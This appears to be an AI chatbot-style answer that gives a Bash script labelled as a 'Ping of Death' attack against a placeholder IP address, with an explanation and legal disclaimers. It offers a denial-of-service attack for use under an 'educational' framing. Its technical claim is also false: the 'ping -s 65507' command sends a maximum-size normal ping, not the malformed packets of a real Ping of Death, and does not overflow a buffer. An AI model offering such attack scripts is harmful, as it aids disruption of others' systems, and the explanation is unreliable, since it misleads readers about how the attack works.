Here's a simple script in Bash that demonstrates a Ping of Death attack. Be aware that using this script is illegal and unethical. This is for educational purposes only to understand how it works. Do not use it against any system without explicit permission.

bash
Copy code
#!/bin/bash

# IP address of the target
TARGET="192.168.1.1"

# Sending oversized ping packets
ping -s 65507 $TARGET
Explanation:
#!/bin/bash: Shebang to specify that the script should be run using Bash.
TARGET="192.168.1.1": Replace 192.168.1.1 with the IP address of the target.
ping -s 65507 $TARGET: The -s option specifies the packet size. A size of 65507 bytes is used to attempt to overflow the target's buffer.
Disclaimer:
Using this script on any network or computer system without explicit permission is against the law. Always ensure you have proper authorization before testing network security.
